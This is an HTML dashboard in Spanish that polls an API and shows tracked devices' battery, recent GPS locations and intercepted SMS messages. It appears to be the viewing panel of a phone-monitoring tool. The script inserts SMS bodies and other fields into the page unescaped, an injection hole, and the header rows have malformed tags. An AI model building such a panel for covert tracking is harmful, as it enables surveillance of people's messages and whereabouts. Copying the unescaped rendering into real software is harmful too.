<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Monitoreo</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
        body { background: #111; color: #fff; padding: 20px; }
        h1 { margin-bottom: 20px; }
        .box { background: #222; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; }
        td, th { border: 1px solid #444; padding: 8px; font-size: 12px; }
    </style>
</head>
<body>
    <h1>📡 Panel de Monitoreo</h1>

    <div class="box">
        <h2>📱 Dispositivos</h2>
        <table id="devs"></table>
    </div>

    <div class="box">
        <h2>📍 Últimas Ubicaciones</h2>
        <table id="locs"></table>
    </div>

    <div class="box">
        <h2>💬 Últimos Mensajes</h2>
        <table id="sms"></table>
    </div>

    <script>
        async function cargar() {
            const res = await fetch("/api/latest");
            const data = await res.json();

            document.getElementById("devs").innerHTML =
                "<tr><th>ID</th><th>Última vez</th><th>Batería</th></trtr>" +
                data.devices.map(d => `<tr><td>${d.id}</td><td>${d.last_seen}</td><td>${d.battery}%</td></tr>`).join("");

            document.getElementById("locs").innerHTML =
                "<tr><th>Latitud</th><th>Longitud</th><th>Fecha</th></trtr>" +
                data.locations.map(l => `<tr><td>${l.lat}</td><td>${l.lon}</td><td>${l.ts}</td></tr>`).join("");

            document.getElementById("sms").innerHTML =
                "<tr><th>De</th><th>Mensaje</th><th>Fecha</th></trtr>" +
                data.sms.map(m => `<tr><td>${m.address}</td><td>${m.body}</td><td>${m.ts}</td></tr>`).join("");
        }
        cargar();
        setInterval(cargar, 10000);
    </script>
</body>
</html>
